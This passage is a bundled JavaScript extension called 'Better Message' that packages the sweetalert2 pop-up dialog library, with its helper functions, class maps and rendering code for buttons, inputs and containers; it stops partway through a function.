// Name: Better Message
// Version: 1.0.0
// ID: BetterMsg
// Description: 更好的弹窗！美观|实用|丰富
// By: Skydog
// License: MIT
// 本拓展经过开发者严格的法律审查，不涉及任何违法行为。
// 使用本拓展造成的任何后果与开发者无关。


(() => {
  var __create = Object.create;
  var __defProp = Object.defineProperty;
  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
  var __getOwnPropNames = Object.getOwnPropertyNames;
  var __getProtoOf = Object.getPrototypeOf;
  var __hasOwnProp = Object.prototype.hasOwnProperty;
  var __commonJS = (cb, mod) => function __require() {
    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
  };
  var __copyProps = (to, from, except, desc) => {
    if (from && typeof from === "object" || typeof from === "function") {
      for (let key of __getOwnPropNames(from))
        if (!__hasOwnProp.call(to, key) && key !== except)
          __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
    }
    return to;
  };
  var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
    // If the importer is in node compatibility mode or this is not an ESM
    // file that has been converted to a CommonJS file using a Babel-
    // compatible transform (i.e. "__esModule" has not been set), then set
    // "default" to the CommonJS "module.exports" for node compatibility.
    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
    mod
  ));

  // node_modules/sweetalert2/dist/sweetalert2.all.js
  var require_sweetalert2_all = __commonJS({
    "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
      (function(global2, factory) {
        typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global2 = typeof globalThis !== "undefined" ? globalThis : global2 || self, global2.Sweetalert2 = factory());
      })(exports, function() {
        "use strict";
        function _arrayLikeToArray(r, a) {
          (null == a || a > r.length) && (a = r.length);
          for (var e = 0, n = Array(a); e < a; e++)
            n[e] = r[e];
          return n;
        }
        function _arrayWithHoles(r) {
          if (Array.isArray(r))
            return r;
        }
        function _arrayWithoutHoles(r) {
          if (Array.isArray(r))
            return _arrayLikeToArray(r);
        }
        function _assertClassBrand(e, t, n) {
          if ("function" == typeof e ? e === t : e.has(t))
            return arguments.length < 3 ? t : n;
          throw new TypeError("Private element is not present on this object");
        }
        function _assertThisInitialized(e) {
          if (void 0 === e)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          return e;
        }
        function _callSuper(t, o, e) {
          return o = _getPrototypeOf(o), _possibleConstructorReturn(t, _isNativeReflectConstruct() ? Reflect.construct(o, e || [], _getPrototypeOf(t).constructor) : o.apply(t, e));
        }
        function _checkPrivateRedeclaration(e, t) {
          if (t.has(e))
            throw new TypeError("Cannot initialize the same private elements twice on an object");
        }
        function _classCallCheck(a, n) {
          if (!(a instanceof n))
            throw new TypeError("Cannot call a class as a function");
        }
        function _classPrivateFieldGet2(s, a) {
          return s.get(_assertClassBrand(s, a));
        }
        function _classPrivateFieldInitSpec(e, t, a) {
          _checkPrivateRedeclaration(e, t), t.set(e, a);
        }
        function _classPrivateFieldSet2(s, a, r) {
          return s.set(_assertClassBrand(s, a), r), r;
        }
        function _construct(t, e, r) {
          if (_isNativeReflectConstruct())
            return Reflect.construct.apply(null, arguments);
          var o = [null];
          o.push.apply(o, e);
          var p = new (t.bind.apply(t, o))();
          return p;
        }
        function _defineProperties(e, r) {
          for (var t = 0; t < r.length; t++) {
            var o = r[t];
            o.enumerable = o.enumerable || false, o.configurable = true, "value" in o && (o.writable = true), Object.defineProperty(e, _toPropertyKey(o.key), o);
          }
        }
        function _createClass(e, r, t) {
          return r && _defineProperties(e.prototype, r), Object.defineProperty(e, "prototype", {
            writable: false
          }), e;
        }
        function _get() {
          return _get = "undefined" != typeof Reflect && Reflect.get ? Reflect.get.bind() : function(e, t, r) {
            var p = _superPropBase(e, t);
            if (p) {
              var n = Object.getOwnPropertyDescriptor(p, t);
              return n.get ? n.get.call(arguments.length < 3 ? e : r) : n.value;
            }
          }, _get.apply(null, arguments);
        }
        function _getPrototypeOf(t) {
          return _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(t2) {
            return t2.__proto__ || Object.getPrototypeOf(t2);
          }, _getPrototypeOf(t);
        }
        function _inherits(t, e) {
          if ("function" != typeof e && null !== e)
            throw new TypeError("Super expression must either be null or a function");
          t.prototype = Object.create(e && e.prototype, {
            constructor: {
              value: t,
              writable: true,
              configurable: true
            }
          }), Object.defineProperty(t, "prototype", {
            writable: false
          }), e && _setPrototypeOf(t, e);
        }
        function _isNativeReflectConstruct() {
          try {
            var t = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {
            }));
          } catch (t2) {
          }
          return (_isNativeReflectConstruct = function() {
            return !!t;
          })();
        }
        function _iterableToArray(r) {
          if ("undefined" != typeof Symbol && null != r[Symbol.iterator] || null != r["@@iterator"])
            return Array.from(r);
        }
        function _iterableToArrayLimit(r, l) {
          var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
          if (null != t) {
            var e, n, i, u, a = [], f = true, o = false;
            try {
              if (i = (t = t.call(r)).next, 0 === l)
                ;
              else
                for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = true)
                  ;
            } catch (r2) {
              o = true, n = r2;
            } finally {
              try {
                if (!f && null != t.return && (u = t.return(), Object(u) !== u))
                  return;
              } finally {
                if (o)
                  throw n;
              }
            }
            return a;
          }
        }
        function _nonIterableRest() {
          throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
        }
        function _nonIterableSpread() {
          throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
        }
        function _possibleConstructorReturn(t, e) {
          if (e && ("object" == typeof e || "function" == typeof e))
            return e;
          if (void 0 !== e)
            throw new TypeError("Derived constructors may only return object or undefined");
          return _assertThisInitialized(t);
        }
        function _setPrototypeOf(t, e) {
          return _setPrototypeOf = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(t2, e2) {
            return t2.__proto__ = e2, t2;
          }, _setPrototypeOf(t, e);
        }
        function _slicedToArray(r, e) {
          return _arrayWithHoles(r) || _iterableToArrayLimit(r, e) || _unsupportedIterableToArray(r, e) || _nonIterableRest();
        }
        function _superPropBase(t, o) {
          for (; !{}.hasOwnProperty.call(t, o) && null !== (t = _getPrototypeOf(t)); )
            ;
          return t;
        }
        function _toConsumableArray(r) {
          return _arrayWithoutHoles(r) || _iterableToArray(r) || _unsupportedIterableToArray(r) || _nonIterableSpread();
        }
        function _toPrimitive(t, r) {
          if ("object" != typeof t || !t)
            return t;
          var e = t[Symbol.toPrimitive];
          if (void 0 !== e) {
            var i = e.call(t, r);
            if ("object" != typeof i)
              return i;
            throw new TypeError("@@toPrimitive must return a primitive value.");
          }
          return String(t);
        }
        function _toPropertyKey(t) {
          var i = _toPrimitive(t, "string");
          return "symbol" == typeof i ? i : i + "";
        }
        function _typeof(o) {
          "@babel/helpers - typeof";
          return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(o2) {
            return typeof o2;
          } : function(o2) {
            return o2 && "function" == typeof Symbol && o2.constructor === Symbol && o2 !== Symbol.prototype ? "symbol" : typeof o2;
          }, _typeof(o);
        }
        function _unsupportedIterableToArray(r, a) {
          if (r) {
            if ("string" == typeof r)
              return _arrayLikeToArray(r, a);
            var t = {}.toString.call(r).slice(8, -1);
            return "Object" === t && r.constructor && (t = r.constructor.name), "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0;
          }
        }
        var RESTORE_FOCUS_TIMEOUT = 100;
        var globalState = {};
        var focusPreviousActiveElement = function focusPreviousActiveElement2() {
          if (globalState.previousActiveElement instanceof HTMLElement) {
            globalState.previousActiveElement.focus();
            globalState.previousActiveElement = null;
          } else if (document.body) {
            document.body.focus();
          }
        };
        var restoreActiveElement = function restoreActiveElement2(returnFocus) {
          return new Promise(function(resolve) {
            if (!returnFocus) {
              return resolve();
            }
            var x = window.scrollX;
            var y = window.scrollY;
            globalState.restoreFocusTimeout = setTimeout(function() {
              focusPreviousActiveElement();
              resolve();
            }, RESTORE_FOCUS_TIMEOUT);
            window.scrollTo(x, y);
          });
        };
        var swalPrefix = "swal2-";
        var classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"];
        var swalClasses = classNames.reduce(
          function(acc, className) {
            acc[className] = swalPrefix + className;
            return acc;
          },
          /** @type {SwalClasses} */
          {}
        );
        var icons = ["success", "warning", "info", "question", "error"];
        var iconTypes = icons.reduce(
          function(acc, icon) {
            acc[icon] = swalPrefix + icon;
            return acc;
          },
          /** @type {SwalIcons} */
          {}
        );
        var consolePrefix = "SweetAlert2:";
        var capitalizeFirstLetter = function capitalizeFirstLetter2(str) {
          return str.charAt(0).toUpperCase() + str.slice(1);
        };
        var warn = function warn2(message) {
          console.warn("".concat(consolePrefix, " ").concat(_typeof(message) === "object" ? message.join(" ") : message));
        };
        var error = function error2(message) {
          console.error("".concat(consolePrefix, " ").concat(message));
        };
        var previousWarnOnceMessages = [];
        var warnOnce = function warnOnce2(message) {
          if (!previousWarnOnceMessages.includes(message)) {
            previousWarnOnceMessages.push(message);
            warn(message);
          }
        };
        var warnAboutDeprecation = function warnAboutDeprecation2(deprecatedParam, useInstead) {
          warnOnce('"'.concat(deprecatedParam, '" is deprecated and will be removed in the next major release. Please use "').concat(useInstead, '" instead.'));
        };
        var callIfFunction = function callIfFunction2(arg) {
          return typeof arg === "function" ? arg() : arg;
        };
        var hasToPromiseFn = function hasToPromiseFn2(arg) {
          return arg && typeof arg.toPromise === "function";
        };
        var asPromise = function asPromise2(arg) {
          return hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
        };
        var isPromise = function isPromise2(arg) {
          return arg && Promise.resolve(arg) === arg;
        };
        var getContainer = function getContainer2() {
          return document.body.querySelector(".".concat(swalClasses.container));
        };
        var elementBySelector = function elementBySelector2(selectorString) {
          var container = getContainer();
          return container ? container.querySelector(selectorString) : null;
        };
        var elementByClass = function elementByClass2(className) {
          return elementBySelector(".".concat(className));
        };
        var getPopup = function getPopup2() {
          return elementByClass(swalClasses.popup);
        };
        var getIcon = function getIcon2() {
          return elementByClass(swalClasses.icon);
        };
        var getIconContent = function getIconContent2() {
          return elementByClass(swalClasses["icon-content"]);
        };
        var getTitle = function getTitle2() {
          return elementByClass(swalClasses.title);
        };
        var getHtmlContainer = function getHtmlContainer2() {
          return elementByClass(swalClasses["html-container"]);
        };
        var getImage = function getImage2() {
          return elementByClass(swalClasses.image);
        };
        var getProgressSteps = function getProgressSteps2() {
          return elementByClass(swalClasses["progress-steps"]);
        };
        var getValidationMessage = function getValidationMessage2() {
          return elementByClass(swalClasses["validation-message"]);
        };
        var getConfirmButton = function getConfirmButton2() {
          return (
            /** @type {HTMLButtonElement} */
            elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.confirm))
          );
        };
        var getCancelButton = function getCancelButton2() {
          return (
            /** @type {HTMLButtonElement} */
            elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.cancel))
          );
        };
        var getDenyButton = function getDenyButton2() {
          return (
            /** @type {HTMLButtonElement} */
            elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.deny))
          );
        };
        var getInputLabel = function getInputLabel2() {
          return elementByClass(swalClasses["input-label"]);
        };
        var getLoader = function getLoader2() {
          return elementBySelector(".".concat(swalClasses.loader));
        };
        var getActions = function getActions2() {
          return elementByClass(swalClasses.actions);
        };
        var getFooter = function getFooter2() {
          return elementByClass(swalClasses.footer);
        };
        var getTimerProgressBar = function getTimerProgressBar2() {
          return elementByClass(swalClasses["timer-progress-bar"]);
        };
        var getCloseButton = function getCloseButton2() {
          return elementByClass(swalClasses.close);
        };
        var focusable = '\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex="0"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n';
        var getFocusableElements = function getFocusableElements2() {
          var popup = getPopup();
          if (!popup) {
            return [];
          }
          var focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
          var focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort(function(a, b) {
            var tabindexA = parseInt(a.getAttribute("tabindex") || "0");
            var tabindexB = parseInt(b.getAttribute("tabindex") || "0");
            if (tabindexA > tabindexB) {
              return 1;
            } else if (tabindexA < tabindexB) {
              return -1;
            }
            return 0;
          });
          var otherFocusableElements = popup.querySelectorAll(focusable);
          var otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter(function(el) {
            return el.getAttribute("tabindex") !== "-1";
          });
          return _toConsumableArray(new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))).filter(function(el) {
            return isVisible$1(el);
          });
        };
        var isModal = function isModal2() {
          return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
        };
        var isToast = function isToast2() {
          var popup = getPopup();
          if (!popup) {
            return false;
          }
          return hasClass(popup, swalClasses.toast);
        };
        var isLoading = function isLoading2() {
          var popup = getPopup();
          if (!popup) {
            return false;
          }
          return popup.hasAttribute("data-loading");
        };
        var setInnerHtml = function setInnerHtml2(elem, html) {
          elem.textContent = "";
          if (html) {
            var parser = new DOMParser();
            var parsed = parser.parseFromString(html, "text/html");
            var head = parsed.querySelector("head");
            head && Array.from(head.childNodes).forEach(function(child) {
              elem.appendChild(child);
            });
            var body = parsed.querySelector("body");
            body && Array.from(body.childNodes).forEach(function(child) {
              if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
                elem.appendChild(child.cloneNode(true));
              } else {
                elem.appendChild(child);
              }
            });
          }
        };
        var hasClass = function hasClass2(elem, className) {
          if (!className) {
            return false;
          }
          var classList = className.split(/\s+/);
          for (var i = 0; i < classList.length; i++) {
            if (!elem.classList.contains(classList[i])) {
              return false;
            }
          }
          return true;
        };
        var removeCustomClasses = function removeCustomClasses2(elem, params) {
          Array.from(elem.classList).forEach(function(className) {
            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
              elem.classList.remove(className);
            }
          });
        };
        var applyCustomClass = function applyCustomClass2(elem, params, className) {
          removeCustomClasses(elem, params);
          if (params.customClass && params.customClass[className]) {
            if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
              warn("Invalid type of customClass.".concat(className, '! Expected string or iterable object, got "').concat(_typeof(params.customClass[className]), '"'));
              return;
            }
            addClass(elem, params.customClass[className]);
          }
        };
        var getInput$1 = function getInput2(popup, inputClass) {
          if (!inputClass) {
            return null;
          }
          switch (inputClass) {
            case "select":
            case "textarea":
            case "file":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses[inputClass]));
            case "checkbox":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.checkbox, " input"));
            case "radio":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:checked")) || popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:first-child"));
            case "range":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.range, " input"));
            default:
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.input));
          }
        };
        var focusInput = function focusInput2(input) {
          input.focus();
          if (input.type !== "file") {
            var val = input.value;
            input.value = "";
            input.value = val;
          }
        };
        var toggleClass = function toggleClass2(target, classList, condition) {
          if (!target || !classList) {
            return;
          }
          if (typeof classList === "string") {
            classList = classList.split(/\s+/).filter(Boolean);
          }
          classList.forEach(function(className) {
            if (Array.isArray(target)) {
              target.forEach(function(elem) {
                condition ? elem.classList.add(className) : elem.classList.remove(className);
              });
            } else {
              condition ? target.classList.add(className) : target.classList.remove(className);
            }
          });
        };
        var addClass = function addClass2(target, classList) {
          toggleClass(target, classList, true);
        };
        var removeClass = function removeClass2(target, classList) {
          toggleClass(target, classList, false);
        };
        var getDirectChildByClass = function getDirectChildByClass2(elem, className) {
          var children = Array.from(elem.children);
          for (var i = 0; i < children.length; i++) {
            var child = children[i];
            if (child instanceof HTMLElement && hasClass(child, className)) {
              return child;
            }
          }
        };
        var applyNumericalStyle = function applyNumericalStyle2(elem, property, value) {
          if (value === "".concat(parseInt(value))) {
            value = parseInt(value);
          }
          if (value || parseInt(value) === 0) {
            elem.style.setProperty(property, typeof value === "number" ? "".concat(value, "px") : value);
          } else {
            elem.style.removeProperty(property);
          }
        };
        var show = function show2(elem) {
          var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
          elem && (elem.style.display = display);
        };
        var hide = function hide2(elem) {
          elem && (elem.style.display = "none");
        };
        var showWhenInnerHtmlPresent = function showWhenInnerHtmlPresent2(elem) {
          var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
          if (!elem) {
            return;
          }
          new MutationObserver(function() {
            toggle(elem, elem.innerHTML, display);
          }).observe(elem, {
            childList: true,
            subtree: true
          });
        };
        var setStyle = function setStyle2(parent, selector, property, value) {
          var el = parent.querySelector(selector);
          if (el) {
            el.style.setProperty(property, value);
          }
        };
        var toggle = function toggle2(elem, condition) {
          var display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
          condition ? show(elem, display) : hide(elem);
        };
        var isVisible$1 = function isVisible2(elem) {
          return !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
        };
        var allButtonsAreHidden = function allButtonsAreHidden2() {
          return !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
        };
        var isScrollable = function isScrollable2(elem) {
          return !!(elem.scrollHeight > elem.clientHeight);
        };
        var hasCssAnimation = function hasCssAnimation2(elem) {
          var style = window.getComputedStyle(elem);
          var animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
          var transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
          return animDuration > 0 || transDuration > 0;
        };
        var animateTimerProgressBar = function animateTimerProgressBar2(timer) {
          var reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
          var timerProgressBar = getTimerProgressBar();
          if (!timerProgressBar) {
            return;
          }
          if (isVisible$1(timerProgressBar)) {
            if (reset) {
              timerProgressBar.style.transition = "none";
              timerProgressBar.style.width = "100%";
            }
            setTimeout(function() {
              timerProgressBar.style.transition = "width ".concat(timer / 1e3, "s linear");
              timerProgressBar.style.width = "0%";
            }, 10);
          }
        };
        var stopTimerProgressBar = function stopTimerProgressBar2() {
          var timerProgressBar = getTimerProgressBar();
          if (!timerProgressBar) {
            return;
          }
          var timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
          timerProgressBar.style.removeProperty("transition");
          timerProgressBar.style.width = "100%";
          var timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
          var timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
          timerProgressBar.style.width = "".concat(timerProgressBarPercent, "%");
        };
        var isNodeEnv = function isNodeEnv2() {
          return typeof window === "undefined" || typeof document === "undefined";
        };
        var sweetHTML = '\n <div aria-labelledby="'.concat(swalClasses.title, '" aria-describedby="').concat(swalClasses["html-container"], '" class="').concat(swalClasses.popup, '" tabindex="-1">\n   <button type="button" class="').concat(swalClasses.close, '"></button>\n   <ul class="').concat(swalClasses["progress-steps"], '"></ul>\n   <div class="').concat(swalClasses.icon, '"></div>\n   <img class="').concat(swalClasses.image, '" />\n   <h2 class="').concat(swalClasses.title, '" id="').concat(swalClasses.title, '"></h2>\n   <div class="').concat(swalClasses["html-container"], '" id="').concat(swalClasses["html-container"], '"></div>\n   <input class="').concat(swalClasses.input, '" id="').concat(swalClasses.input, '" />\n   <input type="file" class="').concat(swalClasses.file, '" />\n   <div class="').concat(swalClasses.range, '">\n     <input type="range" />\n     <output></output>\n   </div>\n   <select class="').concat(swalClasses.select, '" id="').concat(swalClasses.select, '"></select>\n   <div class="').concat(swalClasses.radio, '"></div>\n   <label class="').concat(swalClasses.checkbox, '">\n     <input type="checkbox" id="').concat(swalClasses.checkbox, '" />\n     <span class="').concat(swalClasses.label, '"></span>\n   </label>\n   <textarea class="').concat(swalClasses.textarea, '" id="').concat(swalClasses.textarea, '"></textarea>\n   <div class="').concat(swalClasses["validation-message"], '" id="').concat(swalClasses["validation-message"], '"></div>\n   <div class="').concat(swalClasses.actions, '">\n     <div class="').concat(swalClasses.loader, '"></div>\n     <button type="button" class="').concat(swalClasses.confirm, '"></button>\n     <button type="button" class="').concat(swalClasses.deny, '"></button>\n     <button type="button" class="').concat(swalClasses.cancel, '"></button>\n   </div>\n   <div class="').concat(swalClasses.footer, '"></div>\n   <div class="').concat(swalClasses["timer-progress-bar-container"], '">\n     <div class="').concat(swalClasses["timer-progress-bar"], '"></div>\n   </div>\n </div>\n').replace(/(^|\n)\s*/g, "");
        var resetOldContainer = function resetOldContainer2() {
          var oldContainer = getContainer();
          if (!oldContainer) {
            return false;
          }
          oldContainer.remove();
          removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
          return true;
        };
        var resetValidationMessage$1 = function resetValidationMessage2() {
          globalState.currentInstance.resetValidationMessage();
        };
        var addInputChangeListeners = function addInputChangeListeners2() {
          var popup = getPopup();
          var input = getDirectChildByClass(popup, swalClasses.input);
          var file = getDirectChildByClass(popup, swalClasses.file);
          var range = popup.querySelector(".".concat(swalClasses.range, " input"));
          var rangeOutput = popup.querySelector(".".concat(swalClasses.range, " output"));
          var select = getDirectChildByClass(popup, swalClasses.select);
          var checkbox = popup.querySelector(".".concat(swalClasses.checkbox, " input"));
          var textarea = getDirectChildByClass(popup, swalClasses.textarea);
          input.oninput = resetValidationMessage$1;
          file.onchange = resetValidationMessage$1;
          select.onchange = resetValidationMessage$1;
          checkbox.onchange = resetValidationMessage$1;
          textarea.oninput = resetValidationMessage$1;
          range.oninput = function() {
            resetValidationMessage$1();
            rangeOutput.value = range.value;
          };
          range.onchange = function() {
            resetValidationMessage$1();
            rangeOutput.value = range.value;
          };
        };
        var getTarget = function getTarget2(target) {
          return typeof target === "string" ? document.querySelector(target) : target;
        };
        var setupAccessibility = function setupAccessibility2(params) {
          var popup = getPopup();
          popup.setAttribute("role", params.toast ? "alert" : "dialog");
          popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
          if (!params.toast) {
            popup.setAttribute("aria-modal", "true");
          }
        };
        var setupRTL = function setupRTL2(targetElement) {
          if (window.getComputedStyle(targetElement).direction === "rtl") {
            addClass(getContainer(), swalClasses.rtl);
          }
        };
        var init = function init2(params) {
          var oldContainerExisted = resetOldContainer();
          if (isNodeEnv()) {
            error("SweetAlert2 requires document to initialize");
            return;
          }
          var container = document.createElement("div");
          container.className = swalClasses.container;
          if (oldContainerExisted) {
            addClass(container, swalClasses["no-transition"]);
          }
          setInnerHtml(container, sweetHTML);
          var targetElement = getTarget(params.target);
          targetElement.appendChild(container);
          setupAccessibility(params);
          setupRTL(targetElement);
          addInputChangeListeners();
        };
        var parseHtmlToContainer = function parseHtmlToContainer2(param, target) {
          if (param instanceof HTMLElement) {
            target.appendChild(param);
          } else if (_typeof(param) === "object") {
            handleObject(param, target);
          } else if (param) {
            setInnerHtml(target, param);
          }
        };
        var handleObject = function handleObject2(param, target) {
          if (param.jquery) {
            handleJqueryElem(target, param);
          } else {
            setInnerHtml(target, param.toString());
          }
        };
        var handleJqueryElem = function handleJqueryElem2(target, elem) {
          target.textContent = "";
          if (0 in elem) {
            for (var i = 0; i in elem; i++) {
              target.appendChild(elem[i].cloneNode(true));
            }
          } else {
            target.appendChild(elem.cloneNode(true));
          }
        };
        var animationEndEvent = function() {
          if (isNodeEnv()) {
            return false;
          }
          var testEl = document.createElement("div");
          if (typeof testEl.style.webkitAnimation !== "undefined") {
            return "webkitAnimationEnd";
          }
          if (typeof testEl.style.animation !== "undefined") {
            return "animationend";
          }
          return false;
        }();
        var renderActions = function renderActions2(instance, params) {
          var actions = getActions();
          var loader = getLoader();
          if (!actions || !loader) {
            return;
          }
          if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
            hide(actions);
          } else {
            show(actions);
          }
          applyCustomClass(actions, params, "actions");
          renderButtons(actions, loader, params);
          setInnerHtml(loader, params.loaderHtml || "");
          applyCustomClass(loader, params, "loader");
        };
        function renderButtons(actions, loader, params) {
          var confirmButton = getConfirmButton();
          var denyButton = getDenyButton();
          var cancelButton = getCancelButton();
          if (!confirmButton || !denyButton || !cancelButton) {
            return;
          }
          renderButton(confirmButton, "confirm", params);
          renderButton(denyButton, "deny", params);
          renderButton(cancelButton, "cancel", params);
          handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
          if (params.reverseButtons) {
            if (params.toast) {
              actions.insertBefore(cancelButton, confirmButton);
              actions.insertBefore(denyButton, confirmButton);
            } else {
              actions.insertBefore(cancelButton, loader);
              actions.insertBefore(denyButton, loader);
              actions.insertBefore(confirmButton, loader);
            }
          }
        }
        function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
          if (!params.buttonsStyling) {
            removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
            return;
          }
          addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          if (params.confirmButtonColor) {
            confirmButton.style.backgroundColor = params.confirmButtonColor;
            addClass(confirmButton, swalClasses["default-outline"]);
          }
          if (params.denyButtonColor) {
            denyButton.style.backgroundColor = params.denyButtonColor;
            addClass(denyButton, swalClasses["default-outline"]);
          }
          if (params.cancelButtonColor) {
            cancelButton.style.backgroundColor = params.cancelButtonColor;
            addClass(cancelButton, swalClasses["default-outline"]);
          }
        }
        function renderButton(button, buttonType, params) {
          var buttonName = (
            /** @type {'Confirm' | 'Deny' | 'Cancel'} */
            capitalizeFirstLetter(buttonType)
          );
          toggle(button, params["show".concat(buttonName, "Button")], "inline-block");
          setInnerHtml(button, params["".concat(buttonType, "ButtonText")] || "");
          button.setAttribute("aria-label", params["".concat(buttonType, "ButtonAriaLabel")] || "");
          button.className = swalClasses[buttonType];
          applyCustomClass(button, params, "".concat(buttonType, "Button"));
        }
        var renderCloseButton = function renderCloseButton2(instance, params) {
          var closeButton = getCloseButton();
          if (!closeButton) {
            return;
          }
          setInnerHtml(closeButton, params.closeButtonHtml || "");
          applyCustomClass(closeButton, params, "closeButton");
          toggle(closeButton, params.showCloseButton);
          closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
        };
        var renderContainer = function renderContainer2(instance, params) {
          var container = getContainer();
          if (!container) {
            return;
          }
          handleBackdropParam(container, params.backdrop);
          handlePositionParam(container, params.position);
          handleGrowParam(container, params.grow);
          applyCustomClass(container, params, "container");
        };
        function handleBackdropParam(container, backdrop) {
          if (typeof backdrop === "string") {
            container.style.background = backdrop;
          } else if (!backdrop) {
            addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
          }
        }
        function handlePositionParam(container, position) {
          if (!position) {
            return;
          }
          if (position in swalClasses) {
            addClass(container, swalClasses[position]);
          } else {
            warn('The "position" parameter is not valid, defaulting to "center"');
            addClass(container, swalClasses.center);
          }
        }
        function handleGrowParam(container, grow) {
          if (!grow) {
            return;
          }
          addClass(container, swalClasses["grow-".concat(grow)]);
        }
        var privateProps = {
          innerParams: /* @__PURE__ */ new WeakMap(),
          domCache: /* @__PURE__ */ new WeakMap()
        };
        var inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
        var renderInput = function renderInput2(instance, params) {
          var popup = getPopup();
          if (!popup) {
            return;
          }
          var innerParams = privateProps.innerParams.get(instance);
          var rerender = !innerParams || params.input !== innerParams.input;
          inputClasses.forEach(function(inputClass) {
            var inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
            if (!inputContainer) {
              return;
            }
            setAttributes(inputClass, params.inputAttributes);
            inputContainer.className = swalClasses[inputClass];
            if (rerender) {
              hide(inputContainer);
            }
          });
          if (params.input) {
            if (rerender) {
              showInput(params);
            }
            setCustomClass(params);
          }
        };
        var showInput = function showInput2(params) {
          if (!params.input) {
            return;
          }
          if (!renderInputType[params.input]) {
            error("Unexpected type of input! Expected ".concat(Object.keys(renderInputType).join(" | "), ', got "').concat(params.input, '"'));
            return;
          }
          var inputContainer = getInputContainer(params.input);
          var input = renderInputType[params.input](inputContainer, params);
          show(inputContainer);
          if (params.inputAutoFocus) {
            setTimeout(function() {
              focusInput(input);
            });
          }
        };
        var removeAttributes = function removeAttributes2(input) {
          for (var i = 0; i < input.attributes.length; i++) {
